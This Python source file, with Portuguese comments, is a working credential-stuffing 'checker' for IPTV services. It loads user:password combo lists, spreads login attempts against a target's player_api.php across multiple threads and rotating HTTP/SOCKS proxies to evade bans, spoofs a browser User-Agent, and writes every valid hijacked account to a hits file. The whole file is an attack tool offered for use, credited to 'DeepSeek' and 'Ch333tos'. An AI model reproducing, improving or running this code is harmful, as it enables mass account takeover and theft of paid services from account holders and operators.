import os
import random
import requests
import threading
from datetime import datetime

# Cores para melhorar a visualização
CORES = {
    "vermelho": "\033[91m",
    "verde": "\033[92m",
    "amarelo": "\033[93m",
    "azul": "\033[94m",
    "magenta": "\033[95m",
    "ciano": "\033[96m",
    "reset": "\033[0m",
}

# Função para limpar o host (remover http://, https://, barras e espaços)
def limpar_host(host):
    host = host.replace("http://", "").replace("https://", "")  # Remove protocolos
    host = host.split("/")[0]  # Remove barras no final
    host = host.strip()  # Remove espaços em branco
    return host

# Função para listar arquivos em uma pasta e permitir a escolha pelo número
def escolher_arquivo(pasta, nome_pasta):
    if not os.path.exists(pasta):
        print(f"{CORES['amarelo']}A pasta {nome_pasta} não existe. Criando...{CORES['reset']}")
        os.makedirs(pasta)
        return None

    arquivos = [f for f in os.listdir(pasta) if f.endswith('.txt')]
    if not arquivos:
        print(f"{CORES['vermelho']}Nenhum arquivo encontrado na pasta {nome_pasta}.{CORES['reset']}")
        return None

    print(f"{CORES['ciano']}Arquivos disponíveis em {nome_pasta}:{CORES['reset']}")
    for i, arquivo in enumerate(arquivos):
        print(f"{CORES['azul']}{i + 1}. {arquivo}{CORES['reset']}")

    try:
        escolha = int(input(f"{CORES['verde']}Escolha o número do arquivo > {CORES['reset']}")) - 1
        if 0 <= escolha < len(arquivos):
            return os.path.join(pasta, arquivos[escolha])
        else:
            print(f"{CORES['vermelho']}Escolha inválida.{CORES['reset']}")
            return None
    except ValueError:
        print(f"{CORES['vermelho']}Entrada inválida. Digite um número.{CORES['reset']}")
        return None

# Função para configurar o tipo de proxy
def configurar_proxy(tipo, proxy):
    if tipo == 1:  # HTTP/HTTPS
        return {"http": proxy, "https": proxy}
    elif tipo == 2:  # SOCKS4
        return {"http": f"socks4://{proxy}", "https": f"socks4://{proxy}"}
    elif tipo == 3:  # SOCKS5
        return {"http": f"socks5://{proxy}", "https": f"socks5://{proxy}"}
    else:
        return None

# Função para converter timestamp em data legível (formato DD.MM.YYYY - HH:MM)
def converter_data(timestamp):
    try:
        return datetime.fromtimestamp(int(timestamp)).strftime('%d.%m.%Y - %H:%M')
    except:
        return "Ilimitada!"

# Função para testar usuário e senha (com ou sem proxy)
def test_account(username, password, proxy_config, server, headers):
    url = f"http://{server}/player_api.php?username={username}&password={password}"
    try:
        response = requests.get(
            url,
            proxies=proxy_config,
            headers=headers,
            timeout=10
        )
        if response.status_code == 200:
            try:
                data = response.json()  # Tenta converter a resposta para JSON
                
                # Verifica se o campo 'auth' existe e é igual a 1
                auth = data.get("user_info", {}).get("auth", 0)  # Verifica dentro de 'user_info'
                if auth == 0:
                    auth = data.get("auth", 0)  # Verifica no nível raiz, caso não esteja em 'user_info'

                if auth == 1:
                    # Conta válida (Hit)
                    user_info = data.get("user_info", {})
                    
                    # Busca dinâmica dos campos
                    status = user_info.get("status", data.get("status", "Desconhecido"))  # Verifica em 'user_info' e no nível raiz
                    exp_date = user_info.get("exp_date", data.get("exp_date"))  # Verifica em 'user_info' e no nível raiz
                    exp_date = "Ilimitada!" if exp_date is None else converter_data(exp_date)
                    
                    return username, password, status, exp_date, response.status_code, user_info, "hit"
                else:
                    # Conta inválida (Bad)
                    return username, password, None, None, response.status_code, None, "bad"
            except ValueError:
                # Resposta não é JSON válido (Bad)
                return username, password, None, None, response.status_code, None, "bad"
        elif response.status_code == 403 or response.status_code == 401 or response.status_code == 429:
            # Bloqueio (Ban)
            return username, password, None, None, response.status_code, None, "ban"
        else:
            # Outros erros (Bad)
            return username, password, None, None, response.status_code, None, "bad"
    except Exception as e:
        # Erro na requisição (Bad)
        return username, password, None, None, str(e), None, "bad"

# Função para salvar informações no arquivo de hits
def salvar_hit(server, username, password, status, exp_date, user_info, caminho_arquivo):
    try:
        with open(caminho_arquivo, "a", encoding='utf-8') as f:
            f.write(f"=====[ DEEPSEEK CHECKER ]=====\n")
            
            # MESSAGE (se existir)
            if "message" in user_info and user_info["message"]:
                f.write(f"MESSAGE: {user_info['message']}\n")
            
            # HOST, USER, PASS, STATUS
            f.write(f"HOST: {server}\n")
            f.write(f"USER: {username}\n")
            f.write(f"PASS: {password}\n")
            f.write(f"STATUS: {status}\n")
            
            # TESTE (is_trial)
            if "is_trial" in user_info:
                teste = "SIM" if user_info["is_trial"] == "1" else "NÃO"
                f.write(f"TESTE: {teste}\n")
            
            # EXP (data de expiração formatada)
            if "exp_date" in user_info and user_info["exp_date"]:
                exp_date = converter_data(user_info["exp_date"])
                f.write(f"EXP: {exp_date}\n")
            
            # CRIADO (data de criação formatada)
            if "created_at" in user_info and user_info["created_at"]:
                criado = converter_data(user_info["created_at"])
                f.write(f"CRIADO: {criado}\n")
            
            # CONN: ACT: | MAX: (conexões ativas e máximas)
            if "active_cons" in user_info and "max_connections" in user_info:
                f.write(f"CONN: ACT: {user_info['active_cons']} | MAX: {user_info['max_connections']}\n")
            
            # TIMEZONE (se existir)
            if "timezone" in user_info and user_info["timezone"]:
                f.write(f"TIMEZONE: {user_info['timezone']}\n")
            
            # Rodapé
            f.write(f"====[ IPTV CHK BY: Ch333tos ]====\n\n")
    except Exception as e:
        print(f"{CORES['vermelho']}Erro ao salvar o arquivo: {e}{CORES['reset']}")

# Função para processar combos com múltiplos bots
def processar_combos(combos, server, headers, proxies, tipo_proxy, num_bots, hits, bads, bans, total_linhas, caminho_arquivo):
    lock = threading.Lock()

    def worker():
        nonlocal hits, bads, bans
        while True:
            with lock:
                if not combos:
                    break
                user, password = combos.pop(0)
                linha_atual = total_linhas - len(combos)

            proxy_config = None
            if proxies and tipo_proxy:
                proxy = random.choice(proxies)
                proxy_config = configurar_proxy(tipo_proxy, proxy)

            result = test_account(user, password, proxy_config, server, headers)
            username, password, status, exp_date, status_code, user_info, resultado = result

            with lock:
                if resultado == "hit":
                    hits += 1
                    # Salvar resultado imediatamente
                    salvar_hit(server, username, password, status, exp_date, user_info, caminho_arquivo)
                elif resultado == "bad":
                    bads += 1
                elif resultado == "ban":
                    bans += 1

                # Exibir informações durante o checamento
                exibir_informacoes(server, username, password, status_code, linha_atual, total_linhas, hits, bads, bans)

    threads = []
    for _ in range(num_bots):
        t = threading.Thread(target=worker)
        t.start()
        threads.append(t)

    for t in threads:
        t.join()

    return hits, bads, bans

# Função para exibir informações durante o checamento
def exibir_informacoes(server, user, password, status_code, linha_atual, total_linhas, hits, bads, bans):
    print(f"\n{CORES['azul']}=====> DEEPSEEK ULTRA <====={CORES['reset']}")
    print(f"SERVER > {server}")
    print(f"USUÁRIO > {user}")
    print(f"SENHA > {password}")
    print(f"{CORES['ciano']}=====> INFORMATIVO DS <====={CORES['reset']}")
    print(f"STATUS > {status_code}")
    print(f"LINHA > {linha_atual}/{total_linhas}")
    print(f"HITS > {CORES['verde']}{hits}{CORES['reset']}")
    print(f"BADS > {CORES['vermelho']}{bads}{CORES['reset']}")
    print(f"BANS > {CORES['amarelo']}{bans}{CORES['reset']}")
    print(f"{CORES['magenta']}===> CONFIG BY CH333TOS <==={CORES['reset']}")

# Função principal
def main():
    # Caminho das pastas
    pasta_combo = "/sdcard/combo"
    pasta_proxy = "/sdcard/proxy"
    pasta_hits = "/sdcard/hits"

    # Criar pastas se não existirem
    for pasta in [pasta_combo, pasta_proxy, pasta_hits]:
        if not os.path.exists(pasta):
            print(f"{CORES['amarelo']}A pasta {pasta} não existe. Criando...{CORES['reset']}")
            os.makedirs(pasta)

    # Escolher arquivo de combo
    print(f"{CORES['ciano']}Escolha o arquivo de combo:{CORES['reset']}")
    arquivo_combo = escolher_arquivo(pasta_combo, "combo")
    if not arquivo_combo:
        return

    # Perguntar se deseja usar proxy
    usar_proxy = input(f"{CORES['verde']}Deseja usar proxy? (1 para Sim, 2 para Não) > {CORES['reset']}")
    if usar_proxy not in ["1", "2"]:
        print(f"{CORES['vermelho']}Escolha inválida. Digite 1 para Sim ou 2 para Não.{CORES['reset']}")
        return

    proxies = []
    tipo_proxy = None  # Inicializa tipo_proxy como None
    if usar_proxy == "1":
        print(f"{CORES['ciano']}Escolha o arquivo de proxy:{CORES['reset']}")
        arquivo_proxy = escolher_arquivo(pasta_proxy, "proxy")
        if not arquivo_proxy:
            return

        # Ler proxies
        with open(arquivo_proxy, 'r') as f:
            proxies = [linha.strip() for linha in f.readlines()]

        # Escolher tipo de proxy
        print(f"{CORES['ciano']}Escolha o tipo de proxy:{CORES['reset']}")
        print(f"{CORES['azul']}1. HTTP/HTTPS{CORES['reset']}")
        print(f"{CORES['azul']}2. SOCKS4{CORES['reset']}")
        print(f"{CORES['azul']}3. SOCKS5{CORES['reset']}")
        try:
            tipo_proxy = int(input(f"{CORES['verde']}Digite o número do tipo de proxy > {CORES['reset']}"))
            if tipo_proxy not in [1, 2, 3]:
                print(f"{CORES['vermelho']}Tipo de proxy inválido.{CORES['reset']}")
                return
        except ValueError:
            print(f"{CORES['vermelho']}Entrada inválida. Digite um número.{CORES['reset']}")
            return

    # Perguntar o número de bots
    try:
        num_bots = int(input(f"{CORES['verde']}Digite o número de bots > {CORES['reset']}"))
        if num_bots < 1:
            print(f"{CORES['vermelho']}Número de bots inválido. Deve ser pelo menos 1.{CORES['reset']}")
            return
    except ValueError:
        print(f"{CORES['vermelho']}Entrada inválida. Digite um número.{CORES['reset']}")
        return

    # Perguntar o host do servidor
    server = input(f"{CORES['verde']}Digite o host do servidor (exemplo: meu.servidor.com) > {CORES['reset']}")
    server = limpar_host(server)
    if not server:
        print(f"{CORES['vermelho']}Host inválido.{CORES['reset']}")
        return

    # Ler combos (usuário:senha)
    combos = []
    linhas_invalidas = 0
    with open(arquivo_combo, 'r', encoding='utf-8') as f:
        for linha in f.readlines():
            linha = linha.strip()
            if ":" in linha and len(linha.split(":")) == 2:  # Verifica se a linha está no formato correto
                username, password = linha.split(":", 1)  # Divide apenas no primeiro ":"
                combos.append((username, password))
            else:
                linhas_invalidas += 1

    if linhas_invalidas > 0:
        print(f"{CORES['amarelo']}Removendo {linhas_invalidas} linhas inválidas.{CORES['reset']}")

    if not combos:
        print(f"{CORES['vermelho']}Nenhum combo válido encontrado no arquivo.{CORES['reset']}")
        return

    # Configurar headers personalizados
    headers = {
        "Host": server,
        "Referer": f"http://{server}/",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
        "Accept": "application/json, text/plain, */*",
        "Accept-Language": "pt-BR,pt;q=0.9,en-US;q=0.8,en;q=0.7",
        "Connection": "keep-alive",
        "Cache-Control": "no-cache",
        "Pragma": "no-cache"
    }

    # Formatar nome do arquivo de resultados
    nome_arquivo = f"ChK [ {server.replace(':', '_')} ].txt"
    caminho_arquivo = os.path.join(pasta_hits, nome_arquivo)

    # Contadores de hits, bads e bans
    hits = 0
    bads = 0
    bans = 0
    total_linhas = len(combos)

    # Processar combos com múltiplos bots
    hits, bads, bans = processar_combos(combos, server, headers, proxies, tipo_proxy, num_bots, hits, bads, bans, total_linhas, caminho_arquivo)

    # Exibir resumo final simplificado
    print(f"\n{CORES['magenta']}Obrigado por usar a py, volte sempre! Config by DeepSeek e @Ch333tos{CORES['reset']}")

if __name__ == "__main__":
    main()